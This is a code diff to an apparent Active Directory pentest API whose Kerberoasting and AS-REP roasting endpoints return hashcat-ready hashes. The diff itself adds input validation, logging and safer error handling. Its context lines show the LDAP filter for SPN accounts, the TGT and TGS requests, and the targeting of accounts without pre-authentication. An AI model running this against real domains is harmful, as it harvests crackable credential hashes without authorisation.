@@ -16,12 +16,17 @@ Both endpoints return strings ready to paste into a `hashcat` invocation.
 """
 from __future__ import annotations
 
+import logging
 from typing import Any
 
 from fastapi import APIRouter, HTTPException
 from pydantic import BaseModel, Field
 
 from lib.ad_auth import CredsModel, domain_to_base_dn, open_ldap
+from lib.errors import ErrorCode, MhpError
+from lib.validators import validate_domain, validate_hostname
+
+logger = logging.getLogger(__name__)
 
 router = APIRouter(tags=["kerberos-roast"])
 
@@ -63,14 +68,22 @@ class KerberoastBody(BaseModel):
 def kerberoast(body: KerberoastBody) -> dict[str, Any]:
     imp = _import_impacket()
     creds = body.creds
+    creds.dc_host = validate_hostname(creds.dc_host, field="dc_host")
+    if creds.domain:
+        creds.domain = validate_domain(creds.domain, field="domain")
     if not creds.username or (not creds.password and not creds.nt_hash):
         raise HTTPException(400, "Kerberoasting needs valid AD creds (any user)")
 
     # 1) Query AD for accounts with SPNs via LDAP
     try:
         conn = open_ldap(creds)
-    except Exception as e:
-        raise HTTPException(401, f"LDAP bind failed: {e}")
+    except Exception:
+        logger.exception("kerberoast LDAP bind failed")
+        raise MhpError(
+            "LDAP bind failed",
+            code=ErrorCode.UNAUTHORIZED,
+            status_code=401,
+        ) from None
     try:
         base = domain_to_base_dn(creds.domain)
         filt = "(&(objectCategory=person)(servicePrincipalName=*))"
@@ -103,8 +116,13 @@ def kerberoast(body: KerberoastBody) -> dict[str, Any]:
             "",
             creds.dc_host,
         )
-    except Exception as e:
-        raise HTTPException(401, f"could not get TGT: {e}")
+    except Exception:
+        logger.exception("kerberoast getKerberosTGT failed")
+        raise MhpError(
+            "could not get TGT",
+            code=ErrorCode.UNAUTHORIZED,
+            status_code=401,
+        ) from None
 
     # 3) For each SPN target, request a TGS and format the hash
     hashes: list[dict[str, Any]] = []
@@ -163,6 +181,9 @@ class AsrepBody(BaseModel):
 def asrep_roast(body: AsrepBody) -> dict[str, Any]:
     imp = _import_impacket()
     creds = body.creds
+    creds.dc_host = validate_hostname(creds.dc_host, field="dc_host")
+    if creds.domain:
+        creds.domain = validate_domain(creds.domain, field="domain")
     users: list[str] = list(body.users)
 
     # If user didn't supply a list, try to enumerate via LDAP (requires creds)
@@ -175,8 +196,13 @@ def asrep_roast(body: AsrepBody) -> dict[str, Any]:
             )
         try:
             conn = open_ldap(creds)
-        except Exception as e:
-            raise HTTPException(401, f"LDAP bind failed: {e}")
+        except Exception:
+            logger.exception("asrep LDAP bind failed")
+            raise MhpError(
+                "LDAP bind failed",
+                code=ErrorCode.UNAUTHORIZED,
+                status_code=401,
+            ) from None
         try:
             base = domain_to_base_dn(creds.domain)
             # UAC bit 0x400000 = DONT_REQUIRE_PREAUTH
